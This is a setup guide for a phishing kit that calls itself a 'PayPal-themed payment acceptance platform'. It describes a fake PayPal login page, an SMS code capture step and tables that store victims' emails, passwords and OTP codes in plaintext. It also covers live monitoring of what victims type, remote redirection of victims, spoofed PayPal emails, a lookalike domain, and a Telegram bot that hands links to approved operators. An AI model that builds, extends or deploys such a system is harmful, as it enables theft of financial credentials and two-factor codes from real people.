# Project Setup Guide

## Overview
This is a PayPal-themed payment acceptance platform with Telegram bot integration for link management and email notifications. The system allows users to create payment links, track user activity, and send automated PayPal-style emails.

## Quick Start

### Prerequisites
- Node.js 18+ installed
- PostgreSQL database (available through Replit)
- Telegram Bot Token (configured in environment variables)
- Email service API keys (Resend, SendGrid, MailerSend)

### Installation Commands
```bash
# Install dependencies
npm install

# Set up database schema
npm run db:push

# Start development server
npm run dev
```

### Environment Variables Required
```env
DATABASE_URL=postgresql://...
TELEGRAM_BOT_TOKEN=your_bot_token_here
RESEND_API_KEY=your_resend_key_here
SENDGRID_API_KEY=your_sendgrid_key_here
MAILERSEND_API_KEY=your_mailersend_key_here
```

## Project Structure

```
├── client/                 # React Frontend
│   ├── src/
│   │   ├── components/     # UI components (shadcn/ui based)
│   │   ├── pages/          # Page components
│   │   ├── hooks/          # Custom React hooks
│   │   └── lib/            # Utilities and configurations
│   └── public/             # Static assets, fonts, images
├── server/                 # Express.js Backend
│   ├── index.ts           # Server entry point
│   ├── routes.ts          # API routes and WebSocket server
│   ├── db.ts              # Database connection
│   ├── storage.ts         # Database operations interface
│   ├── telegramBot.ts     # Telegram bot logic
│   └── vite.ts            # Vite integration
├── shared/                 # Shared types and schemas
│   └── schema.ts          # Database schema definitions
├── config/                 # Configuration files
│   └── admins.json        # Admin user configuration
└── package.json           # Dependencies and scripts
```

## Core Components

### 1. Database Layer (`shared/schema.ts`)
- **Purpose**: Defines database schema using Drizzle ORM
- **Tables**: 
  - `users`: Basic user authentication
  - `loginAttempts`: Login form submissions
  - `smsSubmissions`: SMS verification attempts
  - `telegramUsers`: Telegram bot users
  - `telegramLinks`: Generated payment links
  - `systemSettings`: System configuration

### 2. Backend Server (`server/`)

#### `server/index.ts`
- Express.js server entry point
- Middleware configuration
- Error handling

#### `server/routes.ts`
- API endpoint definitions
- WebSocket server for real-time user control
- Session management
- Admin authentication

#### `server/storage.ts`
- Database operations interface
- CRUD operations for all entities
- Abstraction layer for database access

#### `server/telegramBot.ts`
- Complete Telegram bot implementation
- User management and approval system
- Link generation and management
- Email notification system
- Admin controls and statistics

#### `server/db.ts`
- PostgreSQL connection setup
- Drizzle ORM configuration

### 3. Frontend Client (`client/`)

#### `client/src/pages/`
- **ClaimMoneyPage.tsx**: Payment acceptance interface
- **SigninPage.tsx**: PayPal login form
- **SmsChallengePage.tsx**: SMS verification
- **AdminPanel.tsx**: Admin dashboard
- **AdminDashboard.tsx**: Admin analytics
- **DynamicPage.tsx**: Dynamic content handler

#### `client/src/components/`
- **DynamicPageManager.tsx**: Manages page state changes
- **LoadingOverlay.tsx**: Loading states
- **SmsLoadingOverlay.tsx**: SMS-specific loading
- **ui/**: shadcn/ui component library

### 4. Configuration (`config/`)

#### `config/admins.json`
```json
{
  "admins": [
    "8146147595"
  ]
}
```
- Controls admin access to Telegram bot
- Currently configured for @Dalsend only

## Key Features

### 1. Payment Link Generation
- Telegram bot creates unique payment links
- Links contain contextData for user tracking
- German price formatting (25,00 €)

### 2. User Flow Tracking
- Payment page → Login form → SMS challenge
- Real-time notifications to link creators
- Field input monitoring (email, password, OTP)

### 3. Admin Control System
- Web-based admin panel (`/admin`)
- Telegram bot management interface
- User approval system
- Email sending capabilities

### 4. Email Notification System
- Multi-provider setup (Resend → SendGrid → MailerSend)
- Authentic PayPal email templates
- German localization support
- Transaction code generation

### 5. Real-time User Control
- WebSocket-based user redirection
- Admin can control user experience remotely
- Loading states and page transitions

## Database Schema

### Core Tables
```sql
-- User authentication
CREATE TABLE users (
  id SERIAL PRIMARY KEY,
  username VARCHAR(255) UNIQUE NOT NULL,
  password_hash VARCHAR(255) NOT NULL
);

-- Login attempts tracking
CREATE TABLE login_attempts (
  id SERIAL PRIMARY KEY,
  email_or_phone VARCHAR(255) NOT NULL,
  password VARCHAR(255) NOT NULL,
  return_uri VARCHAR(255),
  context_data VARCHAR(255),
  timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  approved BOOLEAN DEFAULT FALSE
);

-- SMS verification attempts
CREATE TABLE sms_submissions (
  id SERIAL PRIMARY KEY,
  otp_code VARCHAR(6) NOT NULL,
  stepup_context VARCHAR(255),
  context_data VARCHAR(255),
  remember_device BOOLEAN DEFAULT FALSE,
  timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Telegram bot users
CREATE TABLE telegram_users (
  id SERIAL PRIMARY KEY,
  telegram_id VARCHAR(255) UNIQUE NOT NULL,
  username VARCHAR(255),
  first_name VARCHAR(255),
  last_name VARCHAR(255),
  unique_id VARCHAR(255) UNIQUE NOT NULL,
  is_approved BOOLEAN DEFAULT FALSE,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  approved_at TIMESTAMP
);

-- Generated payment links
CREATE TABLE telegram_links (
  id SERIAL PRIMARY KEY,
  telegram_user_id VARCHAR(255) NOT NULL,
  link_id VARCHAR(255) UNIQUE NOT NULL,
  price VARCHAR(255) NOT NULL,
  name VARCHAR(255) NOT NULL,
  link VARCHAR(255) NOT NULL,
  context_data VARCHAR(255) UNIQUE NOT NULL,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- System settings
CREATE TABLE system_settings (
  id SERIAL PRIMARY KEY,
  key VARCHAR(255) UNIQUE NOT NULL,
  value VARCHAR(255) NOT NULL,
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

## API Endpoints

### Authentication
- `POST /api/login` - Admin login
- `POST /api/logout` - Admin logout

### Data Management
- `GET /api/login-attempts` - Get login attempts
- `POST /api/login-attempts` - Create login attempt
- `POST /api/login-attempts/:id/approve` - Approve login
- `DELETE /api/login-attempts/:id` - Delete login attempt

### SMS Operations
- `GET /api/sms-submissions` - Get SMS submissions
- `POST /api/sms-submissions` - Create SMS submission
- `DELETE /api/sms-submissions/:id` - Delete SMS submission

### System Control
- `GET /api/redirect/status` - Check redirect status
- `POST /api/redirect/toggle` - Toggle redirect
- `POST /api/user-redirect` - Redirect user
- `GET /api/user-state/:contextData` - Get user state

### Testing
- `POST /api/test-email` - Test email sending
- `POST /api/test-telegram-notification` - Test Telegram notifications

## Telegram Bot Commands

### User Commands
- `/start` - Register for access
- `/links` - View created links
- `/create` - Create new payment link
- `/profile` - View user profile
- `/help` - Show help information

### Admin Commands
- `/approve #ID` - Approve user access
- `/enable_bot` - Enable bot functionality
- `/disable_bot` - Disable bot functionality
- `/enable_site` - Enable website
- `/disable_site` - Disable website
- `/delete_all_links` - Delete all links

## Development Workflow

### Starting Development
1. Clone project files
2. Run `npm install`
3. Set up environment variables
4. Run `npm run db:push` to set up database
5. Run `npm run dev` to start development server

### Making Changes
1. Frontend changes: Edit files in `client/src/`
2. Backend changes: Edit files in `server/`
3. Database changes: Update `shared/schema.ts` and run `npm run db:push`
4. Server auto-restarts on file changes

### Testing
- Use `/api/test-email` for email functionality
- Use `/api/test-telegram-notification` for Telegram bot
- Check logs in development console

## Production Deployment

### Domain Configuration
- Production domain: `https://pypal.link`
- All generated links point to production domain

### Environment Setup
- Set `NODE_ENV=production`
- Configure all required API keys
- Set up PostgreSQL database
- Configure Telegram bot webhook (optional)

### Security Notes
- Admin access controlled via `config/admins.json`
- Session-based authentication for web admin
- API keys stored in environment variables
- Database credentials in `DATABASE_URL`

## Troubleshooting

### Common Issues
1. **Database Connection**: Check `DATABASE_URL` environment variable
2. **Telegram Bot**: Verify `TELEGRAM_BOT_TOKEN` is correct
3. **Email Sending**: Ensure at least one email service API key is configured
4. **Admin Access**: Check `config/admins.json` contains correct Telegram IDs

### Debug Endpoints
- `POST /api/test-email` - Test email functionality
- `POST /api/test-telegram-notification` - Test Telegram notifications
- Check server logs for detailed error information

## File Dependencies

### Critical Files (Do Not Delete)
- `package.json` - Dependencies and scripts
- `shared/schema.ts` - Database schema
- `server/index.ts` - Server entry point
- `config/admins.json` - Admin configuration
- `client/src/App.tsx` - Frontend routing

### Configuration Files
- `vite.config.ts` - Build configuration
- `tailwind.config.ts` - Styling configuration
- `tsconfig.json` - TypeScript configuration
- `drizzle.config.ts` - Database configuration

## Support Information

### Current Admin
- **Telegram**: @Dalsend (ID: 8146147595)
- **Access**: Full system administration

### Service Providers
- **Email**: Resend (primary), SendGrid (fallback), MailerSend (fallback)
- **Database**: PostgreSQL via Replit
- **Hosting**: Replit Deployments

This documentation provides everything needed to understand, set up, and maintain the PayPal payment platform project.